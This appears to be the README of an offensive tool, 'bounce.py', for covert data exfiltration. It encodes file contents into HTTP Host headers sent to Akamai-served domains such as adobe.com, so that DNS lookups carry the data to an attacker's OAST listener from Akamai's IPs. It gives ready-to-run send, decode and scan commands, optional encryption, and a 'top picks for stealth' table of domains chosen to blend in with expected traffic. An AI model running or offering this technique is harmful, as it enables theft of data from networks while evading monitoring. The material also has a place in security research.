# Data Bouncing

Exfiltrate data through DNS queries that originate from Akamai's CDN infrastructure — not your machine.

## How It Works

1. You send an HTTP request to an Akamai-backed domain (e.g. `adobe.com`) on **port 80**
2. The `Host` header contains a crafted domain with your data encoded as hex subdomains
3. Akamai's edge server resolves the Host header to route the request
4. That DNS query hits **your** controlled DNS server — from **Akamai's IP**, not yours
5. The target site returns an error, but the data already bounced through DNS

```
Your Machine ──HTTP──> adobe.com (Akamai Edge)
                           │
                           ├──DNS──> your-payload.your-oast-domain.oast.me
                           │              │
                           │              └──> Your DNS Listener (interactsh)
                           │
                           └──HTTP 4xx──> Your Machine (don't care)
```

Your machine only talks to `adobe.com`. The DNS exfiltration query comes from Akamai.

## Quick Start

```bash
# Install
pip install requests cryptography

# Terminal 1 — start listener
python bounce.py listen

# Terminal 2 — copy the .oast domain, then send a file
python bounce.py send -d "YOUR_DOMAIN.oast.me" -u adobe.com -f secret.txt -i mysession

# Terminal 2 — decode
python bounce.py decode -l interactsh.log
```

## Commands

### `send` — Exfiltrate a file

```bash
# Single bounce domain
python bounce.py send -d "OAST_DOMAIN" -u adobe.com -f file.txt -i session1

# Multiple bounce domains (distributes chunks)
python bounce.py send -d "OAST_DOMAIN" -u adobe.com intuit.com avast.com -f file.txt -i session1

# From a file of domains
python bounce.py send -d "OAST_DOMAIN" -F domains.txt -f file.txt -i session1

# With AES encryption
python bounce.py send -d "OAST_DOMAIN" -u adobe.com -f file.txt -i session1 -k "MySecretKey"
```

### `decode` — Reconstruct from DNS logs

```bash
# Auto-detect all sessions, write to ./output/
python bounce.py decode -l interactsh.log

# Specific session
python bounce.py decode -l interactsh.log -i session1

# With decryption
python bounce.py decode -l interactsh.log -k "MySecretKey"
```

### `scan` — Test which domains bounce

```bash
# Test domains from file
python bounce.py scan -d "OAST_DOMAIN" -F domains.txt -m raw

# Test specific domains
python bounce.py scan -d "OAST_DOMAIN" -u adobe.com intuit.com -m raw
```

### `listen` — Start interactsh and log to file

```bash
python bounce.py listen                    # logs to interactsh.log
python bounce.py listen -o mylog.txt       # custom log file
```

## Vulnerable Domains

See [`vulnerable_domains.txt`](vulnerable_domains.txt) for the full list of **117 confirmed domains** that bounce DNS queries through Akamai's infrastructure.

Top picks for stealth:

| Domain | Why |
|---|---|
| `adobe.com` | Creative Cloud phones home on every workstation |
| `intuit.com` | QuickBooks traffic expected in any business |
| `avast.com` | Looks like antivirus updates |
| `www.norton.com` | Looks like antivirus updates |
| `www.microsoft.com` | Expected everywhere |
| `www.eset.com` | Looks like antivirus updates |

## The Vulnerability

This is an **Akamai infrastructure-level issue**. When Akamai's edge servers receive an HTTP request on port 80 with an unrecognized Host header, they perform a DNS lookup on the Host header value to determine routing. This DNS query originates from Akamai's edge IPs, effectively proxying the DNS resolution.

- **Affected**: Akamai-served domains on port 80 (raw HTTP)
- **Not affected**: Cloudflare, Fastly, AWS CloudFront, Azure Front Door
- **Impact**: Data exfiltration where DNS queries are attributed to Akamai, not the attacker
- **Detection difficulty**: Network logs show only HTTP traffic to legitimate domains

## Prerequisites

- Python 3.10+
- [interactsh-client](https://github.com/projectdiscovery/interactsh) for DNS capture
- `pip install requests cryptography`

```bash
# Install interactsh
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

## Credits

Built on the original data bouncing research by John and Dave at [thecontractor.io](https://thecontractor.io/data-bouncing/). Original PowerShell implementation by [Unit-259](https://github.com/Unit-259). Python rewrite and Akamai vulnerability research by [@chukfinley](https://github.com/chukfinley).

## Disclaimer

This project is for educational and authorized security testing purposes only. Use responsibly and ensure you comply with all applicable laws and regulations.
